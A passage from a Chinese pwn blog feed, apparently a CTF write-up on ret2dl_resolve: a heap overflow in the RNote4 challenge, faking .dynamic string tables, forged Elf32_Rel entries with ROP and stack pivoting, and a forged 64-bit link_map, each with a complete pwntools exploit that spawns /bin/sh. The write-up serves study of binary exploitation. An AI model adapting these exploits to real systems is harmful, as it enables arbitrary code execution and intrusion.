class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写.dynamic指向字符串表的指针，使其指向一块可写内存，比如.bss，然后再写这块内存，使得相应偏移出刚好有个system\x00。exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=<span class="keyword">True</span></span><br><span class="line"><span class="comment">#e=ELF('./libc.so.6')</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process(<span class="string">'./RNote4'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#伪造的字符串表，(0x457-0x3f8)刚好是"free\x00"字符串的偏移</span></span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line"><span class="comment">#先新建两个notes</span></span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line"><span class="comment">#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line"><span class="comment">#在0x6020C8处写入伪造的字符串表</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#会第一次调用free，所以实际上是system("/bin/sh")被调用，如前面所说</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造Elf32-Rel"><a href="#伪造Elf32-Rel" class="headerlink" title="伪造Elf32_Rel"></a>伪造Elf32_Rel</h3><p>通过操纵第二个参数，使其指向我们所构造的Elf32_Rel</p><p>当.dynamic不可写时，那么以上方法就没用了，所以有第二种利用方法<br> 上面我们讲完了函数的解析流程 主要是由dl_runtime_resolve(link_map,rel_offset),之所以它能解析不同函数的地址，以为我们传入的rel_offset不同，因此，把传入的rel_offset改为我们希望的函数的偏移，便可以执行我们希望的函数，新的问题来了，.rel.plt中不一定存在我们希望的函数，因此就需要我们伪造一个.rel.plt，将rel_offset修改为一个比较大的值，在.rel.plt+rel_offset的地方是我们伪造好的，结构跟.rel.plt相同的数据，这样我们就相当于伪造好了reloc（重定位入口），程序又会根据r_info找到对应的.dynsym中的symbols，我们再次伪造symbols的内容-&gt;st_name,使得到的str在我们的可控地址内，然后在.dynstr+st_name地址处放置库函数字符串例如：system。</p><p>所以，最终的利用思路，大概是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400610</span> ; __unwind &#123;</span><br><span class="line">.plt:<span class="number">0000000000400610</span>                 push    cs:qword_602008</span><br><span class="line">.plt:<span class="number">0000000000400616</span>                 jmp     cs:qword_602010</span><br><span class="line">.plt:<span class="number">0000000000400616</span> sub_400610      endp</span><br></pre></td></tr></table></figure></p><p>构造ROP，跳转到resolve的PLT，push link_map的位置，就是上面所示的这个地方，也就是要调用_dl_runtime_resolve的地方,此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移</p><p>伪造一个很大的rel_offset，一直偏移到bss段（一般这里可读可写，且位于.rel.plt的高地址）</p><p>伪造Elf32_Rel即.rel.plt的结构,由RELSZ可知，它的大小为8字节（commend: readelf -d fun 可以看到），我们需要fake r_offset,以及r_info，r_offset一般是函数在.got.plt的地址，r_info可以用来计算在symtab中的index并且保存了类型，所以我们可以让伪造的symtab的数据紧跟在这段数据后面，这样我们就可以计算出它的index: index=(bss+0×100-.dynsym)/0×10(因为SYMENT指明大小为16字节)，类型必须为7，所以我们就可以计算出r_info的值<br>r_info=(index &lt;&lt; 8 ) | 0x7</p><p>伪造symtab，这一部分包含四个字段，我们只需要改st_name部分即可，其余部分按照程序原有的值赋值，st_name表示了字符串相对strtab的偏移，我们可以将字符串写在紧邻这一部分的高地址处</p><p>伪造strtab，这里我们直接将所需库函数的字符串写入即可，例如system<br>dl_runtime_resolve函数便会将system函数的地址，写到read函数对应的got表中去，再次调用read就相当于调用了system函数</p><p>利用思路如下:</p><p>第一次调用read函数，返回地址再溢出成read函数，这次参数给一个.bss的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个read之后，ROP到leave; retn的地址，以便切栈切到在.bss中我们构造的下一个ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure><p>第二次调用read函数，此时要sendROP链以及所有相关的伪造数据结构完整的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./fun'</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080484ab</span></span><br><span class="line">leave_ret=<span class="number">0x08048378</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_stack_size=<span class="number">0x800</span></span><br><span class="line">bss=<span class="number">0x0804a01c</span></span><br><span class="line">read_plt=<span class="number">0x080482e0</span></span><br><span class="line">read_got=<span class="number">0x0804a00c</span></span><br><span class="line">bss_stage=bss+fake_stack_size</span><br><span class="line">dynsym=<span class="number">0x080481cc</span></span><br><span class="line">dynstr=<span class="number">0x0804821c</span></span><br><span class="line">dl_runtime_resolve=<span class="number">0x080482d0</span></span><br><span class="line">relplt=<span class="number">0x08048298</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_offset=bss_stage+<span class="number">28</span>-relplt</span><br><span class="line">fake_sym_addr=bss_stage+<span class="number">36</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>) <span class="comment">#为了16字节对齐</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'align==&gt;'</span>+hex(align)</span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line">index=(fake_sym_addr-dynsym)/<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'index==&gt;'</span>+hex(index)</span><br><span class="line">r_info=(index&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'r_info==&gt;'</span>+hex(r_info)</span><br><span class="line"></span><br><span class="line">fake_raloc=p32(read_got)+p32(r_info)</span><br><span class="line">st_name=fake_sym_addr-dynstr+<span class="number">16</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">binsh=<span class="string">'/bin/sh'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(dl_runtime_resolve)</span><br><span class="line">payload+=p32(rel_offset)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(bss_stage+<span class="number">80</span>)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=fake_raloc</span><br><span class="line">payload+=<span class="string">'a'</span>*align</span><br><span class="line">payload+=fake_sym</span><br><span class="line">payload+=<span class="string">'system\0'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">80</span>-len(payload))</span><br><span class="line">payload+=binsh+<span class="string">'\x00'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">100</span>-len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a>伪造link_map</h3><p>64位情况下，伪造rel.plt变得不可行，因为在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=(<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); </span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx]; </span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>) </span><br><span class="line">      version = <span class="literal">NULL</span>; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里，出现了访问未映射的内存<br>主要是reloc-&gt;r_info过大的原因，因为我们在bss段伪造的数据，而bss段一般位于0x600000<br>然后真正的rel.plt位于0x400000内，导致过大。<br>如果我们在里0x400000处有可读写的区域，或许就可以成功 </p><p>因此，我们得另外想办法，那么得回过来看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        ...  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们到最外层的else里去，如果，我们伪造link_map，让sym-&gt;st_value为某个已经解析了的函数的地址,比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址</p><p>如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得</p><p>为了伪造link_map，我们需要知道link_map的结构，在glibc/include/link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可,</p><p>以jiavis oj level3_x64为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">'./level3_x64'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b*0x400618')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line">universal_gadget1 = <span class="number">0x4006AA</span></span><br><span class="line">universal_gadget2 = <span class="number">0x400690</span></span><br><span class="line"> </span><br><span class="line">Elf64_Sym_len = <span class="number">0x18</span></span><br><span class="line">Elf64_Rela_len = <span class="number">0x18</span></span><br><span class="line">write_addr = <span class="number">0x600ad0</span></span><br><span class="line">link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">rbp = write_addr<span class="number">-8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">leave = <span class="number">0x400618</span></span><br><span class="line">main = <span class="number">0x4005E6</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = l+0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = l+0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = l+0xf8</span></span><br><span class="line"> </span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_link_map_gen</span><span class="params">(link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + <span class="number">0x18</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr = link_map_addr + <span class="number">8</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr = link_map_addr</span><br><span class="line">    fake_Elf64_Dyn_JMPREL = p64(<span class="number">0</span>) + p64(link_map_addr+<span class="number">0x28</span>)</span><br><span class="line">    fake_Elf64_Dyn_SYM = p64(<span class="number">0</span>) + p64(st_value<span class="number">-8</span>)</span><br><span class="line">    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    fake_link_map = p64(l_addr)            <span class="comment">#0x8</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_SYM    <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_JMPREL <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_rela       <span class="comment">#0x18</span></span><br><span class="line">    fake_link_map += <span class="string">'\x00'</span>*<span class="number">0x28</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) <span class="comment">#link_map_addr + 0x68</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) <span class="comment">#link_map_addr + 0x70</span></span><br><span class="line">    fake_link_map += <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)</span><br><span class="line">    <span class="keyword">return</span> fake_link_map</span><br><span class="line">fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span></span><br><span class="line">payload += p64(rbp)</span><br><span class="line">payload += p64(universal_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment">#pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'read'</span>])  <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(len(fake_link_map)+<span class="number">0x18</span>) <span class="comment">#pop r13</span></span><br><span class="line">payload += p64(write_addr)  <span class="comment">#pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment">#pop r15</span></span><br><span class="line">payload += p64(universal_gadget2)  <span class="comment">#ret</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(main)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">fake_info = p64(<span class="number">0x4004A6</span>)        <span class="comment">#jmp</span></span><br><span class="line">fake_info += p64(link_map_addr)</span><br><span class="line">fake_info += p64(<span class="number">0</span>)</span><br><span class="line">fake_info += fake_link_map</span><br><span class="line">p.send(fake_info)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span>+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+<span class="number">0x78</span>)+p64(leave)</span><br><span class="line"><span class="comment">#stack pivot,进入函数重定向</span></span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/170661.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/sy
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
